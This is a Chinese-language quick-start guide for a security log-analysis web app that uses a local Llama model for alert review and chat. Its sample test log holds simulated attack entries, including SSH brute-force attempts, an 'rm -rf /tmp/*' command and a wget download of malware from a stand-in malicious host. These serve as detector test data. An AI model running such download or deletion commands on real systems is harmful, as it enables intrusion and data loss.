# 快速開始指南

## 📱 一鍵啟動

### 使用 Docker Compose（推薦）

```bash
cd OS_demo
docker-compose up -d
```

所有服務將自動啟動，訪問 http://localhost 即可

### 本地開發

#### 1. 安裝依賴

```bash
cd OS_demo
bash install.sh
```

#### 2. 在三個不同的終端中運行

**終端 1 - 啟動 Ollama:**
```bash
ollama serve
# 首次使用需要下載模型
ollama pull llama3:8b
```

**終端 2 - 啟動後端:**
```bash
cd backend
python main.py
```

**終端 3 - 啟動前端:**
```bash
cd frontend
npm start
```

## 🎯 首次使用

1. 打開 http://localhost:3000
2. 進入「日誌上傳」頁面
3. 上傳一個日誌檔案（.log 或 .txt）
4. 查看解析結果
5. 在「智能對話」頁面與 AI 進行互動

## 🔧 配置

### 後端配置 (backend/.env)

```env
# Ollama 設定
OLLAMA_URL=http://localhost:11434
OLLAMA_MODEL=llama3:8b

# 安全設定
JWT_SECRET=your-secret-key-here

# 調試模式
DEBUG=False

# 日誌目錄
LOG_DIR=/var/log
```

### 前端配置 (frontend/.env.local)

```env
# API 伺服器地址
REACT_APP_API_URL=http://localhost:8000
```

## 📚 API 文檔

完整的 API 文檔可訪問：
- **Swagger UI**: http://localhost:8000/docs
- **ReDoc**: http://localhost:8000/redoc

## 🎨 主要功能

### 儀表板
- 實時警訊統計
- 風險分佈圖表
- 事件時間軸

### 日誌上傳
- 批次上傳日誌檔案
- 自動解析和分類
- 詳細的事件列表

### 警訊中心
- 按嚴重程度過濾
- 查看警訊詳情
- 管理警訊

### 智能對話
- 多輪對話
- 與 LLM 進行安全分析
- 對話歷史記錄

## 🆘 常見問題

### Q: 後端無法連接 Ollama？
A: 確保 Ollama 已啟動：
```bash
curl http://localhost:11434/api/tags
```

### Q: 找不到 LLaMA 模型？
A: 下載模型：
```bash
ollama pull llama3:8b
```

### Q: 無法讀取系統日誌？
A: Linux 下需要權限：
```bash
sudo usermod -aG adm $USER
newgrp adm
```

### Q: 前端連接不到後端？
A: 檢查 .env 中的 API URL：
```env
REACT_APP_API_URL=http://localhost:8000
```

## 📊 測試日誌檔案

創建 test_log.txt 進行測試：

```
May 10 14:23:45 ubuntu sshd[1234]: Invalid user admin from 192.168.1.100 port 54321
May 10 14:23:46 ubuntu sshd[1235]: Failed password for root from 192.168.1.100 port 54322
May 10 14:24:00 ubuntu sudo[5678]: user : COMMAND=/bin/rm -rf /tmp/*
May 10 14:24:05 ubuntu kernel: audit: type=EXECVE msg=audit(1621699445.123:456): argc=3 argv[0]="/usr/bin/wget" argv[1]="http://malicious.com/malware"
May 10 14:24:10 ubuntu auth.log: authentication failure; logname= uid=0 euid=0 tty=pts/0 ruser= rhost=192.168.1.50 user=testuser
```

將其上傳到應用進行測試。

## 🚀 生產部署

### 使用 Docker Compose

編輯 docker-compose.yml，然後：

```bash
docker-compose -f docker-compose.yml up -d
```

### 手動部署

1. 配置 Python 環境
2. 配置 Node.js 環境
3. 配置 Nginx 反向代理
4. 使用 systemd 管理服務
5. 配置 SSL/TLS 證書

## 📖 更多文檔

- [後端文檔](backend/README.md)
- [前端文檔](frontend/README.md)
- [原始規格書](OS掃毒系統_工程規格書_v1.1.docx)

---

需要幫助？查看[主要 README](README.md)或提交 Issue！
